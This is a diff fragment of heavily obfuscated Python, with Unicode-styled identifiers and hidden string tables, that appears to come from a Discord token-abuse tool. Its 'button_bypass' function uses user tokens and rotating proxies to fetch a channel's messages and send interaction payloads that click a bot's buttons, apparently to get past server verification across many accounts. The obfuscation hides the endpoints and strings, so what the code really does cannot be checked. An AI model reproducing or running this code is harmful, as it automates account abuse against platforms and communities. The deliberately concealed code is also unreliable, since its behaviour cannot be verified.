-        𝘳𝘳 = 𝘳𝗲𝗾𝘂𝘦𝘴𝙩𝘀.patch(f'{𝘕𝙈𝘔𝘔𝙉𝗹𝙡𝘔𝙈𝘭𝙈𝗠𝙉𝗹𝘐𝘔𝙄𝘐𝘕𝙈𝘐𝗜𝙈𝘐𝗹𝘐𝘕𝙄𝘔𝗜𝙄𝗠[332]}', headers=𝙝𝗲𝘢𝙙𝘦𝘳𝙨, json=𝗽𝙖𝘆𝙡𝙤𝗮𝗱)
-    if 𝘳𝙧.status_code == 200:
-        𝙥𝗿𝙞𝙣𝘁(f"{𝗿}{𝘕𝙈𝘔𝘔𝗡𝙡𝙡𝘔𝘔𝘭𝗠𝗠𝙉𝙡𝘐𝗠𝘐𝘐𝙉𝘔𝘐𝘐𝘔𝘐𝗹𝘐𝘕𝙄𝙈𝗜𝘐𝘔[98]}{𝙙𝘢𝙩𝘦𝘵𝘪𝙢𝗲.datetime.now().strftime(f'{𝙜}{𝘕𝘔𝗠𝘔𝙉𝙡𝙡𝘔𝗠𝗹𝘔𝗠𝘕𝗹𝙄𝙈𝙄𝙄𝙉𝘔𝘐𝘐𝙈𝙄𝗹𝗜𝗡𝙄𝘔𝗜𝘐𝗠[99]}{𝗿}')}{𝙉𝙈𝘔𝗠𝘕𝙡𝗹𝗠𝙈𝙡𝘔𝘔𝘕𝙡𝘐𝗠𝘐𝗜𝙉𝘔𝙄𝗜𝙈𝗜𝘭𝘐𝗡𝘐𝗠𝘐𝘐𝙈[100]}{𝘳}{𝙉𝘔𝗠𝘔𝙉𝘭𝘭𝗠𝗠𝘭𝗠𝗠𝗡𝙡𝘐𝗠𝘐𝙄𝙉𝙈𝘐𝗜𝙈𝗜𝗹𝙄𝘕𝗜𝘔𝗜𝘐𝗠[98]}{𝙡𝙘}{𝗡𝗠𝙈𝙈𝙉𝗹𝘭𝘔𝙈𝘭𝘔𝗠𝘕𝘭𝘐𝘔𝘐𝙄𝙉𝘔𝘐𝙄𝗠𝗜𝘭𝙄𝙉𝘐𝗠𝗜𝘐𝘔[308]}{𝘳}{𝙉𝙈𝗠𝗠𝘕𝗹𝙡𝘔𝗠𝗹𝘔𝗠𝗡𝘭𝘐𝙈𝙄𝙄𝘕𝘔𝗜𝙄𝙈𝗜𝗹𝙄𝙉𝘐𝗠𝗜𝙄𝙈[100]}{𝘯𝘯}{𝘨}{𝙉𝗠𝗠𝗠𝙉𝗹𝘭𝘔𝗠𝙡𝗠𝗠𝙉𝘭𝙄𝘔𝘐𝘐𝙉𝗠𝗜𝘐𝙈𝗜𝗹𝘐𝗡𝘐𝘔𝘐𝘐𝗠[256]}")
+        𝗿𝘳 = 𝗿𝗲𝗾𝘶𝙚𝙨𝙩𝙨.patch(f'{𝘐𝙉𝙄𝘕𝗹𝙡𝙄𝘔𝙄𝘐𝗹𝘔𝘭𝘭𝙄𝘭𝘭𝗡𝘕𝘐𝙡𝘭𝙈𝘕𝗹𝗡𝗹𝗠𝘐𝙈𝗜𝘔[325]}', headers=𝗵𝘦𝙖𝘥𝙚𝗿𝙨, json=𝙥𝗮𝘆𝘭𝘰𝘢𝗱)
+    if 𝘳𝗿.status_code == 200:
+        𝘱𝙧𝙞𝙣𝘁(f"{𝘳}{𝙄𝗡𝙄𝗡𝙡𝘭𝘐𝗠𝗜𝙄𝗹𝘔𝗹𝗹𝙄𝗹𝘭𝘕𝗡𝘐𝙡𝙡𝙈𝘕𝗹𝘕𝗹𝙈𝘐𝘔𝙄𝙈[91]}{𝗱𝘢𝘵𝘦𝘁𝘪𝘮𝙚.datetime.now().strftime(f'{𝘨}{𝙄𝗡𝙄𝗡𝗹𝗹𝗜𝗠𝙄𝙄𝗹𝙈𝗹𝙡𝙄𝗹𝗹𝘕𝘕𝙄𝙡𝗹𝘔𝙉𝘭𝗡𝘭𝘔𝙄𝙈𝘐𝙈[92]}{𝗿}')}{𝙄𝙉𝙄𝙉𝗹𝗹𝗜𝙈𝘐𝘐𝙡𝙈𝗹𝙡𝙄𝘭𝗹𝙉𝘕𝙄𝘭𝗹𝙈𝙉𝙡𝙉𝘭𝙈𝘐𝘔𝘐𝘔[93]}{𝘳}{𝗜𝙉𝙄𝗡𝘭𝗹𝙄𝘔𝙄𝘐𝘭𝙈𝙡𝗹𝗜𝘭𝘭𝗡𝗡𝙄𝘭𝘭𝙈𝘕𝙡𝗡𝗹𝗠𝘐𝙈𝗜𝙈[91]}{𝗹𝘤}{𝘐𝗡𝗜𝘕𝗹𝙡𝙄𝘔𝗜𝘐𝘭𝙈𝗹𝘭𝙄𝗹𝗹𝘕𝗡𝙄𝗹𝙡𝗠𝙉𝗹𝗡𝘭𝘔𝗜𝗠𝘐𝘔[301]}{𝗿}{𝙄𝗡𝗜𝙉𝙡𝙡𝙄𝘔𝘐𝙄𝗹𝗠𝙡𝙡𝗜𝙡𝗹𝘕𝘕𝘐𝙡𝘭𝗠𝙉𝙡𝗡𝗹𝗠𝘐𝘔𝗜𝙈[93]}{𝙣𝘯}{𝙜}{𝙄𝘕𝙄𝙉𝗹𝙡𝘐𝘔𝗜𝗜𝘭𝙈𝙡𝙡𝘐𝗹𝗹𝘕𝘕𝗜𝗹𝙡𝙈𝘕𝘭𝙉𝙡𝙈𝙄𝙈𝙄𝙈[249]}")
     else:
-        𝘱𝗿𝗶𝘯𝙩(f"{𝗿}{𝙉𝗠𝘔𝗠𝗡𝘭𝙡𝘔𝗠𝗹𝗠𝗠𝗡𝘭𝗜𝙈𝗜𝙄𝗡𝗠𝙄𝗜𝗠𝗜𝗹𝘐𝗡𝙄𝙈𝙄𝘐𝗠[98]}{𝙙𝗮𝘁𝗲𝘁𝙞𝗺𝙚.datetime.now().strftime(f'{𝗴}{𝗡𝗠𝗠𝙈𝗡𝙡𝘭𝙈𝗠𝘭𝘔𝗠𝙉𝙡𝗜𝘔𝙄𝘐𝙉𝗠𝘐𝙄𝗠𝙄𝘭𝘐𝘕𝙄𝙈𝗜𝗜𝘔[99]}{𝙧}')}{𝘕𝙈𝘔𝙈𝗡𝘭𝘭𝘔𝗠𝗹𝘔𝘔𝘕𝘭𝙄𝘔𝘐𝙄𝘕𝘔𝗜𝙄𝗠𝘐𝗹𝘐𝘕𝗜𝗠𝙄𝘐𝙈[100]}{𝙧}{𝗡𝘔𝗠𝘔𝘕𝘭𝙡𝗠𝘔𝗹𝗠𝗠𝙉𝘭𝗜𝙈𝘐𝙄𝗡𝗠𝙄𝙄𝙈𝙄𝙡𝗜𝘕𝗜𝘔𝗜𝗜𝗠[98]}{𝗯}{𝘕𝘔𝙈𝗠𝘕𝘭𝘭𝗠𝗠𝙡𝗠𝘔𝙉𝗹𝘐𝘔𝗜𝗜𝗡𝘔𝙄𝘐𝘔𝙄𝘭𝗜𝙉𝗜𝗠𝗜𝙄𝘔[276]}{𝙧}{𝘕𝗠𝘔𝘔𝘕𝘭𝙡𝗠𝘔𝘭𝙈𝙈𝗡𝙡𝘐𝘔𝙄𝙄𝗡𝙈𝙄𝘐𝙈𝗜𝘭𝗜𝘕𝙄𝘔𝘐𝗜𝘔[100]}{𝘯𝙣}{𝗴}{𝘕𝙈𝗠𝘔𝘕𝙡𝙡𝙈𝘔𝗹𝘔𝘔𝙉𝘭𝗜𝗠𝗜𝘐𝗡𝙈𝗜𝙄𝗠𝗜𝙡𝗜𝗡𝗜𝗠𝗜𝘐𝘔[277]}{𝙧𝙧.text}")
+        𝗽𝙧𝙞𝗻𝘁(f"{𝘳}{𝙄𝘕𝘐𝙉𝗹𝗹𝗜𝙈𝗜𝘐𝗹𝙈𝘭𝙡𝘐𝘭𝗹𝙉𝗡𝘐𝙡𝙡𝘔𝗡𝘭𝘕𝙡𝘔𝗜𝘔𝙄𝙈[91]}{𝘥𝙖𝘁𝗲𝘵𝙞𝘮𝘦.datetime.now().strftime(f'{𝗴}{𝗜𝗡𝗜𝘕𝙡𝗹𝘐𝗠𝙄𝘐𝗹𝗠𝗹𝙡𝘐𝘭𝙡𝗡𝗡𝗜𝗹𝘭𝙈𝘕𝘭𝙉𝘭𝙈𝗜𝗠𝘐𝙈[92]}{𝘳}')}{𝙄𝘕𝘐𝙉𝗹𝙡𝙄𝘔𝗜𝙄𝙡𝘔𝘭𝙡𝘐𝗹𝙡𝗡𝘕𝗜𝙡𝗹𝘔𝘕𝘭𝗡𝙡𝘔𝘐𝘔𝘐𝙈[93]}{𝙧}{𝙄𝙉𝙄𝘕𝗹𝗹𝘐𝗠𝗜𝗜𝗹𝗠𝙡𝘭𝙄𝙡𝗹𝗡𝗡𝗜𝗹𝗹𝘔𝙉𝙡𝘕𝘭𝙈𝙄𝙈𝘐𝙈[91]}{𝙗}{𝙄𝗡𝘐𝘕𝙡𝗹𝘐𝗠𝘐𝙄𝘭𝙈𝙡𝘭𝙄𝘭𝙡𝘕𝘕𝗜𝙡𝗹𝘔𝙉𝙡𝗡𝘭𝙈𝗜𝘔𝗜𝗠[269]}{𝗿}{𝙄𝘕𝘐𝘕𝗹𝙡𝘐𝗠𝙄𝙄𝙡𝗠𝘭𝙡𝘐𝗹𝙡𝘕𝗡𝘐𝙡𝙡𝘔𝗡𝘭𝗡𝗹𝗠𝗜𝙈𝗜𝗠[93]}{𝗻𝙣}{𝙜}{𝗜𝘕𝘐𝘕𝗹𝘭𝙄𝙈𝘐𝘐𝙡𝗠𝙡𝗹𝙄𝙡𝘭𝙉𝘕𝗜𝗹𝗹𝙈𝙉𝙡𝘕𝗹𝙈𝗜𝙈𝘐𝗠[270]}{𝘳𝗿.text}")
 
 def button_bypass(token, message_link, optionbutton):
-    𝗱𝙣 = 𝘵𝙤𝙠𝗲𝙣.split(𝗡𝙈𝘔𝘔𝘕𝘭𝙡𝘔𝙈𝘭𝙈𝘔𝗡𝘭𝗜𝗠𝗜𝘐𝘕𝗠𝗜𝙄𝘔𝘐𝙡𝘐𝙉𝗜𝘔𝘐𝘐𝗠[254])
-    𝙣𝘯 = 𝙙𝘯[0]
-    𝙝𝘦𝗮𝗱𝘦𝙧𝘴 = 𝗛𝗲𝙖𝙙𝘦𝗿𝘀(𝘁𝘰𝘬𝗲𝙣)
+    𝘥𝙣 = 𝙩𝙤𝙠𝘦𝘯.split(𝘐𝘕𝗜𝗡𝗹𝘭𝘐𝙈𝘐𝙄𝘭𝙈𝙡𝘭𝘐𝘭𝘭𝗡𝘕𝘐𝘭𝗹𝘔𝙉𝘭𝘕𝘭𝘔𝙄𝗠𝙄𝙈[247])
+    𝙣𝘯 = 𝗱𝗻[0]
+    𝗵𝙚𝘢𝗱𝗲𝘳𝘀 = 𝗛𝘦𝗮𝗱𝙚𝘳𝘀(𝘵𝘰𝙠𝙚𝗻)
     try:
-        𝙜𝘶𝘪𝘭𝘥_𝙞𝘥 = 𝘮𝗲𝙨𝘀𝗮𝗴𝙚_𝙡𝘪𝗻𝘬.split(𝙉𝗠𝗠𝙈𝘕𝘭𝘭𝙈𝗠𝘭𝘔𝙈𝙉𝗹𝘐𝗠𝗜𝙄𝘕𝙈𝙄𝘐𝘔𝗜𝗹𝗜𝘕𝘐𝗠𝙄𝘐𝘔[322])[4]
-        𝗰𝗵𝙖𝘯𝙣𝙚𝙡_𝗶𝙙 = 𝙢𝗲𝘴𝘴𝘢𝙜𝗲_𝘭𝗶𝗻𝗸.split(𝙉𝘔𝗠𝘔𝗡𝘭𝘭𝗠𝙈𝗹𝙈𝙈𝙉𝙡𝙄𝗠𝘐𝘐𝘕𝘔𝗜𝘐𝗠𝙄𝗹𝘐𝗡𝗜𝘔𝗜𝙄𝙈[322])[5]
-        𝘮𝘦𝘴𝘴𝘢𝙜𝗲_𝗶𝘥 = 𝗺𝘦𝙨𝘴𝘢𝗴𝙚_𝘭𝗶𝗻𝘬.split(𝘕𝗠𝙈𝘔𝙉𝗹𝗹𝗠𝗠𝘭𝘔𝘔𝘕𝙡𝘐𝙈𝙄𝘐𝘕𝙈𝙄𝙄𝗠𝘐𝗹𝘐𝙉𝙄𝙈𝙄𝗜𝗠[322])[6]
-        𝘱𝘢𝙮𝗹𝙤𝗮𝙙 = {𝗡𝘔𝗠𝙈𝙉𝗹𝘭𝘔𝘔𝘭𝗠𝙈𝗡𝙡𝙄𝘔𝗜𝙄𝙉𝘔𝙄𝗜𝘔𝗜𝙡𝙄𝘕𝗜𝘔𝘐𝗜𝘔[333]: 𝘕𝙈𝙈𝘔𝙉𝙡𝙡𝘔𝙈𝘭𝙈𝙈𝙉𝗹𝘐𝘔𝘐𝙄𝘕𝗠𝘐𝗜𝙈𝙄𝙡𝙄𝘕𝙄𝗠𝘐𝘐𝗠[335], 𝘕𝙈𝗠𝗠𝙉𝘭𝙡𝙈𝗠𝗹𝘔𝗠𝘕𝘭𝘐𝘔𝗜𝙄𝗡𝙈𝘐𝙄𝙈𝙄𝘭𝘐𝙉𝙄𝗠𝙄𝗜𝗠[334]: 𝙢𝘦𝙨𝘴𝗮𝘨𝙚_𝙞𝘥}
-        if 𝙥𝗿𝙤𝙭𝘆:
-            𝗿𝙧 = 𝘳𝙚𝗾𝘶𝘦𝘴𝙩𝘀.get(𝙉𝙈𝗠𝘔𝘕𝙡𝙡𝘔𝙈𝗹𝗠𝘔𝗡𝗹𝗜𝗠𝙄𝙄𝙉𝙈𝙄𝗜𝘔𝙄𝗹𝘐𝙉𝙄𝗠𝗜𝗜𝙈[273] + 𝙘𝙝𝗮𝘯𝗻𝘦𝘭_𝙞𝗱 + 𝗡𝗠𝙈𝙈𝘕𝙡𝗹𝘔𝘔𝙡𝗠𝗠𝘕𝙡𝘐𝙈𝘐𝗜𝘕𝗠𝗜𝙄𝗠𝙄𝗹𝘐𝘕𝘐𝗠𝗜𝙄𝗠[274], params=𝘱𝙖𝘆𝙡𝗼𝙖𝗱, headers=𝙝𝘦𝙖𝘥𝘦𝙧𝙨, proxy={𝘕𝙈𝘔𝙈𝗡𝘭𝙡𝙈𝙈𝘭𝘔𝗠𝙉𝗹𝙄𝘔𝙄𝙄𝗡𝗠𝗜𝗜𝘔𝙄𝘭𝘐𝙉𝗜𝙈𝗜𝘐𝗠[251]: 𝗡𝘔𝙈𝗠𝘕𝗹𝗹𝗠𝙈𝗹𝘔𝘔𝙉𝘭𝙄𝙈𝙄𝗜𝘕𝙈𝗜𝗜𝘔𝘐𝘭𝘐𝗡𝙄𝗠𝗜𝘐𝗠[253] + 𝙧𝗮𝘯𝙙𝙤𝗺.choice(𝘱𝗿𝘰𝙭𝘪𝘦𝘀), 𝘕𝙈𝗠𝘔𝗡𝗹𝘭𝘔𝙈𝘭𝘔𝙈𝙉𝙡𝙄𝙈𝗜𝙄𝘕𝘔𝘐𝘐𝘔𝘐𝗹𝙄𝗡𝘐𝘔𝗜𝙄𝗠[252]: 𝙉𝗠𝙈𝘔𝘕𝗹𝘭𝘔𝙈𝘭𝘔𝗠𝘕𝘭𝙄𝘔𝗜𝘐𝗡𝘔𝘐𝗜𝙈𝗜𝘭𝘐𝘕𝗜𝘔𝗜𝗜𝗠[253] + 𝙧𝙖𝘯𝘥𝙤𝘮.choice(𝘱𝙧𝙤𝙭𝘪𝘦𝘀)})
+        𝗴𝘂𝘪𝙡𝘥_𝘪𝘥 = 𝘮𝙚𝙨𝘀𝗮𝙜𝙚_𝘭𝗶𝙣𝙠.split(𝙄𝘕𝗜𝙉𝙡𝘭𝘐𝗠𝙄𝙄𝘭𝙈𝙡𝙡𝘐𝙡𝗹𝙉𝘕𝘐𝗹𝗹𝗠𝘕𝗹𝙉𝙡𝙈𝘐𝗠𝙄𝗠[315])[4]
+        𝗰𝘩𝙖𝗻𝘯𝙚𝘭_𝙞𝗱 = 𝙢𝗲𝘀𝙨𝙖𝘨𝗲_𝘭𝙞𝗻𝙠.split(𝘐𝘕𝙄𝗡𝗹𝙡𝘐𝗠𝘐𝘐𝘭𝘔𝗹𝙡𝘐𝗹𝘭𝙉𝗡𝗜𝗹𝘭𝗠𝗡𝗹𝙉𝙡𝗠𝙄𝙈𝙄𝗠[315])[5]
+        𝗺𝙚𝘀𝙨𝙖𝙜𝘦_𝘪𝘥 = 𝘮𝗲𝘀𝘀𝙖𝗴𝗲_𝙡𝘪𝙣𝙠.split(𝗜𝘕𝗜𝙉𝗹𝘭𝘐𝘔𝘐𝗜𝘭𝙈𝗹𝙡𝘐𝗹𝘭𝗡𝗡𝙄𝘭𝘭𝙈𝙉𝗹𝙉𝗹𝘔𝙄𝗠𝗜𝘔[315])[6]
+        𝘱𝗮𝙮𝙡𝘰𝘢𝘥 = {𝙄𝘕𝘐𝘕𝙡𝗹𝘐𝗠𝙄𝘐𝙡𝗠𝗹𝘭𝗜𝗹𝙡𝙉𝘕𝗜𝘭𝘭𝙈𝘕𝘭𝗡𝙡𝗠𝙄𝙈𝘐𝙈[326]: 𝙄𝙉𝗜𝘕𝗹𝗹𝙄𝙈𝗜𝘐𝗹𝘔𝙡𝘭𝙄𝙡𝙡𝘕𝗡𝙄𝗹𝘭𝘔𝘕𝗹𝙉𝙡𝘔𝗜𝗠𝗜𝙈[328], 𝘐𝙉𝗜𝙉𝙡𝙡𝘐𝙈𝘐𝙄𝗹𝗠𝙡𝗹𝗜𝗹𝗹𝘕𝘕𝙄𝘭𝘭𝗠𝙉𝗹𝙉𝙡𝙈𝗜𝗠𝙄𝘔[327]: 𝗺𝙚𝙨𝙨𝙖𝘨𝙚_𝘪𝘥}
+        if 𝙥𝙧𝗼𝙭𝘆:
+            𝘳𝘳 = 𝗿𝘦𝙦𝙪𝘦𝘴𝘁𝘀.get(𝙄𝘕𝗜𝘕𝗹𝙡𝗜𝘔𝗜𝙄𝗹𝙈𝗹𝗹𝘐𝘭𝘭𝙉𝘕𝗜𝘭𝗹𝙈𝙉𝗹𝗡𝙡𝙈𝗜𝗠𝙄𝘔[266] + 𝘤𝘩𝘢𝙣𝗻𝗲𝙡_𝘪𝘥 + 𝙄𝘕𝙄𝗡𝗹𝗹𝙄𝗠𝗜𝘐𝗹𝘔𝘭𝙡𝙄𝙡𝙡𝙉𝗡𝙄𝗹𝗹𝙈𝙉𝙡𝘕𝙡𝗠𝙄𝘔𝘐𝙈[267], params=𝘱𝘢𝙮𝙡𝗼𝙖𝘥, headers=𝘩𝘦𝗮𝙙𝘦𝘳𝙨, proxy={𝙄𝙉𝙄𝘕𝙡𝘭𝘐𝘔𝙄𝙄𝗹𝙈𝙡𝘭𝗜𝙡𝗹𝗡𝘕𝘐𝘭𝘭𝗠𝘕𝙡𝙉𝘭𝘔𝗜𝗠𝙄𝙈[244]: 𝗜𝘕𝗜𝗡𝗹𝙡𝗜𝙈𝙄𝙄𝙡𝘔𝘭𝗹𝙄𝙡𝙡𝙉𝗡𝗜𝘭𝗹𝙈𝘕𝗹𝗡𝘭𝘔𝗜𝘔𝗜𝗠[246] + 𝗿𝙖𝙣𝙙𝘰𝘮.choice(𝙥𝙧𝗼𝘅𝘪𝘦𝘀), 𝘐𝙉𝗜𝗡𝙡𝗹𝗜𝗠𝘐𝙄𝙡𝘔𝙡𝙡𝙄𝙡𝗹𝗡𝙉𝘐𝙡𝗹𝗠𝘕𝙡𝙉𝗹𝙈𝘐𝗠𝘐𝗠[245]: 𝘐𝗡𝘐𝙉𝙡𝗹𝘐𝙈𝗜𝘐𝗹𝗠𝙡𝘭𝗜𝙡𝙡𝘕𝗡𝗜𝘭𝗹𝙈𝘕𝗹𝗡𝙡𝗠𝘐𝗠𝗜𝘔[246] + 𝘳𝙖𝗻𝗱𝘰𝙢.choice(𝙥𝙧𝘰𝘅𝗶𝘦𝘴)})
         else:
-            𝗿𝘳 = 𝙧𝙚𝘲𝙪𝘦𝘴𝙩𝘀.get(𝙉𝘔𝙈𝙈𝗡𝙡𝗹𝙈𝙈𝗹𝘔𝗠𝗡𝗹𝙄𝘔𝘐𝘐𝗡𝙈𝗜𝙄𝙈𝙄𝙡𝗜𝘕𝙄𝗠𝘐𝗜𝗠[273] + 𝗰𝙝𝘢𝙣𝘯𝙚𝗹_𝘪𝗱 + 𝘕𝙈𝙈𝙈𝘕𝙡𝘭𝗠𝘔𝗹𝙈𝙈𝗡𝗹𝙄𝘔𝘐𝗜𝘕𝘔𝗜𝘐𝘔𝙄𝗹𝘐𝙉𝘐𝘔𝗜𝙄𝗠[274], params=𝘱𝘢𝙮𝗹𝙤𝘢𝗱, headers=𝗵𝗲𝘢𝗱𝙚𝘳𝙨)
-        𝙢𝘦𝙨𝙨𝙖𝘨𝗲𝘀 = 𝗿𝘳.json()
-        𝘮𝙚𝘴𝘀𝙖𝗴𝗲𝙗𝘰𝘁𝘵𝙤𝙘𝗹𝙞𝗰𝘬 = None
-        for 𝘅 in 𝙢𝗲𝘀𝘀𝗮𝗴𝘦𝙨:
-            if 𝘅[𝙉𝘔𝗠𝙈𝘕𝘭𝘭𝗠𝙈𝗹𝗠𝙈𝗡𝗹𝗜𝘔𝘐𝘐𝘕𝗠𝘐𝙄𝘔𝗜𝗹𝙄𝘕𝙄𝙈𝗜𝗜𝗠[167]] == 𝙢𝗲𝙨𝘀𝙖𝗴𝘦_𝗶𝘥:
-                𝘮𝗲𝙨𝘀𝗮𝗴𝗲𝗯𝗼𝙩𝘁𝙤𝘤𝘭𝗶𝙘𝗸 = 𝘅
-        if 𝘮𝗲𝘀𝘀𝗮𝙜𝙚𝙗𝘰𝘁𝘁𝙤𝘤𝙡𝙞𝗰𝙠 == None:
+            𝙧𝗿 = 𝗿𝘦𝙦𝘶𝘦𝙨𝙩𝙨.get(𝘐𝘕𝘐𝘕𝙡𝗹𝘐𝙈𝙄𝙄𝙡𝘔𝗹𝘭𝙄𝗹𝙡𝗡𝘕𝙄𝘭𝘭𝙈𝘕𝘭𝙉𝙡𝘔𝘐𝙈𝗜𝙈[266] + 𝘤𝗵𝗮𝗻𝙣𝙚𝙡_𝗶𝗱 + 𝗜𝙉𝘐𝙉𝗹𝙡𝘐𝙈𝗜𝘐𝗹𝙈𝗹𝘭𝘐𝘭𝘭𝘕𝗡𝙄𝙡𝗹𝗠𝙉𝙡𝗡𝗹𝗠𝙄𝙈𝗜𝘔[267], params=𝙥𝘢𝙮𝘭𝘰𝙖𝙙, headers=𝘩𝙚𝗮𝗱𝗲𝙧𝙨)
+        𝗺𝘦𝘀𝙨𝘢𝙜𝗲𝘴 = 𝙧𝘳.json()
+        𝙢𝘦𝘴𝙨𝘢𝗴𝘦𝘣𝗼𝘵𝙩𝘰𝗰𝗹𝗶𝙘𝗸 = None
+        for 𝘅 in 𝗺𝘦𝙨𝘴𝘢𝙜𝗲𝘀:
+            if 𝘹[𝗜𝗡𝘐𝗡𝙡𝘭𝘐𝘔𝙄𝗜𝗹𝗠𝗹𝘭𝙄𝙡𝙡𝘕𝗡𝙄𝙡𝗹𝙈𝗡𝗹𝗡𝙡𝗠𝘐𝘔𝘐𝗠[160]] == 𝙢𝘦𝘀𝘀𝙖𝙜𝗲_𝗶𝘥:
+                𝘮𝗲𝘀𝙨𝙖𝗴𝙚𝘣𝙤𝘁𝘵𝘰𝗰𝗹𝙞𝙘𝘬 = 𝙭
+        if 𝘮𝗲𝘀𝙨𝗮𝗴𝘦𝗯𝘰𝘁𝘵𝙤𝘤𝙡𝙞𝗰𝘬 == None:
             pass
-        𝗯𝘂𝘵𝘁𝗼𝘯𝙨 = []
-        𝘭𝙞𝙘𝘇𝙗𝘢 = 0
-        for 𝙭 in 𝗺𝙚𝙨𝘴𝙖𝗴𝗲𝗯𝗼𝘁𝘁𝗼𝙘𝙡𝗶𝘤𝘬[𝘕𝗠𝗠𝘔𝘕𝙡𝗹𝘔𝘔𝙡𝘔𝙈𝗡𝙡𝗜𝙈𝗜𝙄𝘕𝗠𝗜𝘐𝘔𝙄𝙡𝙄𝙉𝗜𝙈𝗜𝘐𝙈[336]]:
-            𝗽𝗿𝗶𝘯𝘵(f"{𝙧}{𝗡𝗠𝘔𝙈𝗡𝙡𝘭𝘔𝙈𝗹𝘔𝘔𝙉𝘭𝗜𝗠𝙄𝙄𝙉𝗠𝘐𝙄𝗠𝘐𝗹𝙄𝘕𝗜𝘔𝗜𝘐𝙈[98]}{𝙙𝗮𝘁𝙚𝙩𝘪𝘮𝙚.datetime.now().strftime(f'{𝘨}{𝘕𝗠𝙈𝗠𝘕𝙡𝙡𝗠𝗠𝙡𝘔𝙈𝘕𝗹𝘐𝙈𝘐𝙄𝗡𝙈𝗜𝙄𝙈𝙄𝙡𝗜𝘕𝙄𝙈𝙄𝗜𝘔[99]}{𝙧}')}{𝙉𝙈𝙈𝗠𝗡𝙡𝘭𝗠𝘔𝘭𝘔𝗠𝘕𝗹𝙄𝘔𝙄𝙄𝗡𝗠𝘐𝙄𝙈𝘐𝗹𝙄𝙉𝗜𝙈𝙄𝗜𝗠[100]}{𝗿}{𝙉𝘔𝗠𝘔𝙉𝙡𝙡𝙈𝘔𝗹𝗠𝙈𝗡𝗹𝗜𝗠𝙄𝗜𝘕𝙈𝗜𝗜𝗠𝙄𝙡𝘐𝘕𝗜𝗠𝗜𝗜𝙈[98]}{𝗹𝗰}{𝗡𝙈𝘔𝘔𝙉𝙡𝘭𝙈𝗠𝗹𝙈𝗠𝘕𝙡𝙄𝙈𝗜𝙄𝗡𝙈𝘐𝗜𝘔𝗜𝙡𝗜𝙉𝘐𝙈𝙄𝗜𝙈[308]}{𝗿}{𝘕𝗠𝗠𝗠𝘕𝗹𝙡𝘔𝙈𝘭𝗠𝙈𝗡𝗹𝘐𝙈𝙄𝙄𝗡𝙈𝗜𝙄𝘔𝘐𝘭𝗜𝗡𝗜𝘔𝙄𝗜𝘔[100]}{𝘯𝙣}{𝘕𝘔𝗠𝗠𝗡𝗹𝘭𝙈𝘔𝘭𝗠𝘔𝘕𝘭𝗜𝙈𝘐𝗜𝗡𝙈𝙄𝗜𝙈𝗜𝘭𝗜𝘕𝗜𝘔𝙄𝙄𝗠[256]}{𝗴}")
-            𝙗𝙪𝘵𝘵𝗼𝗻𝙨.append(𝘹[𝗡𝙈𝘔𝘔𝙉𝘭𝗹𝗠𝘔𝘭𝗠𝙈𝘕𝘭𝗜𝙈𝗜𝘐𝙉𝗠𝙄𝙄𝙈𝙄𝗹𝘐𝙉𝘐𝙈𝘐𝗜𝙈[336]][0])
-            𝘭𝗶𝘤𝙯𝘣𝘢 = 𝙡𝘪𝘤𝙯𝙗𝙖 + 1
-        𝗷𝘴𝘰𝙣_𝘥𝙖𝘁𝙖 = {𝘕𝘔𝘔𝗠𝘕𝙡𝗹𝘔𝘔𝘭𝙈𝘔𝙉𝘭𝘐𝗠𝘐𝙄𝘕𝘔𝘐𝗜𝗠𝘐𝙡𝙄𝗡𝙄𝙈𝘐𝙄𝘔[312]: 3, 𝗡𝙈𝗠𝘔𝙉𝘭𝗹𝘔𝘔𝙡𝙈𝙈𝘕𝘭𝙄𝘔𝗜𝙄𝗡𝗠𝘐𝗜𝗠𝙄𝘭𝙄𝗡𝘐𝗠𝘐𝗜𝙈[337]: 𝘕𝘔𝗠𝙈𝗡𝘭𝘭𝙈𝘔𝗹𝗠𝗠𝙉𝙡𝙄𝘔𝙄𝗜𝗡𝗠𝙄𝗜𝙈𝘐𝘭𝘐𝘕𝘐𝙈𝙄𝘐𝘔[29], 𝙉𝙈𝙈𝙈𝗡𝙡𝙡𝙈𝘔𝙡𝘔𝘔𝙉𝘭𝘐𝗠𝗜𝙄𝘕𝙈𝙄𝙄𝘔𝗜𝘭𝘐𝙉𝗜𝘔𝗜𝙄𝙈[168]: 𝙜𝘂𝙞𝙡𝙙_𝘪𝙙, 𝙉𝙈𝘔𝗠𝘕𝙡𝙡𝙈𝗠𝙡𝙈𝗠𝘕𝙡𝘐𝘔𝙄𝗜𝙉𝘔𝙄𝘐𝗠𝘐𝙡𝗜𝗡𝙄𝘔𝗜𝗜𝘔[268]: 𝗰𝙝𝘢𝘯𝗻𝗲𝗹_𝘪𝗱, 𝙉𝘔𝘔𝗠𝙉𝙡𝘭𝘔𝘔𝘭𝙈𝘔𝙉𝗹𝗜𝙈𝗜𝙄𝘕𝙈𝘐𝗜𝗠𝙄𝘭𝙄𝗡𝘐𝗠𝙄𝘐𝗠[338]: 0, 𝘕𝙈𝘔𝙈𝗡𝘭𝙡𝘔𝙈𝙡𝘔𝗠𝘕𝘭𝘐𝗠𝙄𝘐𝘕𝘔𝗜𝘐𝙈𝗜𝗹𝘐𝙉𝗜𝙈𝗜𝙄𝙈[339]: 𝘮𝗲𝘀𝘴𝗮𝘨𝗲_𝗶𝙙, 𝙉𝗠𝘔𝙈𝘕𝗹𝙡𝙈𝙈𝗹𝗠𝘔𝘕𝘭𝗜𝘔𝗜𝘐𝙉𝗠𝗜𝙄𝗠𝙄𝘭𝗜𝘕𝙄𝘔𝙄𝗜𝙈[340]: 𝙢𝙚𝘀𝙨𝙖𝘨𝘦𝘣𝗼𝘁𝙩𝘰𝙘𝗹𝗶𝗰𝘬[𝙉𝙈𝘔𝗠𝙉𝙡𝘭𝘔𝘔𝙡𝘔𝙈𝙉𝙡𝗜𝗠𝗜𝙄𝘕𝙈𝗜𝘐𝙈𝘐𝗹𝘐𝗡𝙄𝙈𝙄𝗜𝗠[341]][𝙉𝗠𝗠𝙈𝗡𝗹𝘭𝗠𝗠𝘭𝗠𝘔𝙉𝘭𝙄𝙈𝗜𝘐𝙉𝙈𝘐𝗜𝘔𝙄𝗹𝘐𝘕𝘐𝘔𝙄𝗜𝙈[167]], 𝗡𝙈𝙈𝗠𝘕𝘭𝗹𝗠𝘔𝗹𝘔𝘔𝗡𝗹𝗜𝙈𝙄𝘐𝗡𝗠𝙄𝘐𝙈𝘐𝗹𝙄𝙉𝗜𝙈𝗜𝘐𝙈[148]: 𝘂𝙪𝘪𝙙.uuid4().hex, 